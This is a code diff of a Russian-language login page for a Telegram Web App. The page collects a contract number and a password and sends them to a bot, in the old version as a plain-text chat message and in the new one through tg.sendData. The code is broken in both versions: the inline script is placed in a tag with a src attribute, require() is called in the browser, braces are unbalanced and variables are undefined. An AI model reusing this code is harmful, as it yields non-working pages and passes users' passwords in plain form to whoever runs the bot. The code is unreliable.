@@ -9,7 +9,7 @@
 <body>
   <header><h1>Авторизация</h1></header>
   <main>
-    <form action= "/registr" method="post">
+    <form id="from">
       <input type="text" name="agreement" placeholder="номер договора" class="form-control" maxlength="16" id="agreement">
       <input type="password" name="password" placeholder="Пароль" class="form-control"maxlength="32" id="password">
       <input type="hidden" name="data" id="data">
@@ -17,34 +17,25 @@
     </form>
   </main>
 <script src="https://telegram.org/js/telegram-web-app.js">
-// Подключаем библиотеку Telegram Web App
-const Telegram = require("telegram-web-app");
 
-// Создаем объект бота
-const bot = new Telegram({
-  // Токен бота
-  token: "YOUR_BOT_TOKEN",
-  // Айди чата, в который будут отправляться данные
-  chatId: "YOUR_CHAT_ID",
+var tg  = window.Telegram.WebApp
+
+function register() {
+  // Получить данные из формы
+  var agreement = document.getElementById("agreement").value;
+  var password = document.getElementById("password").value;
+
+  order.addEventListener("click", () =>{
+    tg.close();
 });
-
-// Обработчик события отправки формы
-document.querySelector("#order").addEventListener("click", async () => {
-  // Получаем данные из полей формы
-  const agreement = document.querySelector("#agreement").value;
-  const password = document.querySelector("#password").value;
-
-  // Формируем сообщение для отправки
-  const message = {
-    // Текст сообщения
-    text: `Новая заявка:
-    Номер договора: ${agreement}
-    Пароль: ${password}`,
+  // Создать переменную data
+  let data = {
+    agreement: agreement,
+    password: password
   };
 
-  // Отправляем сообщение
-  await bot.sendMessage(message);
-});
+tg.sendData(JSON.stringify(data));
+
 </script>
 </body>
 </html>
